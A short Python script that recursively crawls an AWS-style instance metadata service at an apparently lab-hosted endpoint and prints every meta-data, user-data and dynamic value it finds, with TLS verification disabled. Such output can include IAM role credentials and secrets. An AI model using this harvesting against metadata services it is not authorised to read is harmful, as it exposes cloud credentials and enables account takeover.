import requests
from colorama import Fore

def download_aws_metadata(url):
    try:
        response = requests.get(url, verify=False)
        if response.status_code == 200:
            lines = response.text.split('\n')
            for line in lines:
                if line.endswith('/'):
                    download_aws_metadata(url + line)
                else:
                    print(f"{Fore.GREEN}URL: {url + line}")
                    response = requests.get(url + line, verify=False)
                    print(f"{Fore.WHITE}{response.text}")
    # Exception handle
    except Exception as e:
        print(f"Error: {e}")

def main():
    urls = ["http://metadata.services.cityinthe.cloud:1338/latest/meta-data/", "http://metadata.services.cityinthe.cloud:1338/latest/user-data/", "http://metadata.services.cityinthe.cloud:1338/latest/dynamic/"]
    for url in urls:
        download_aws_metadata(url)

if __name__ == "__main__":
    main()
